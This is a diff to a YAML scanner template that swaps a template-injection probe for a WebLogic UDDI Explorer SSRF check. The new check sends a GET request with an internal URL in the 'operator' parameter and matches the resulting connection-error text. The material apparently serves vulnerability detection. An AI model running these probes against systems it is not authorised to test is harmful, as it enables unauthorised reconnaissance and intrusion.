@@ -1,12 +1,18 @@
-name: ssrf
+name: weblogic-ssrf
 request:
- path: "/"
+ path: "/uddiexplorer/SearchPublicRegistries.jsp"
  method: GET
  param:
-  name: "{{7*'7'}}"
-  
+  rdoSearch: name
+  txtSearchname: sdf
+  txtSearchkey: ""
+  txtSearchfor: ""
+  selfor: Business location
+  btnSubmit: Search
+  operator: "http://127.0.0.1:1"
+
  
 
 matcher:
   type: word
-  words: ["7777777"]
+  words: ["could not connect over HTTP to server:"]
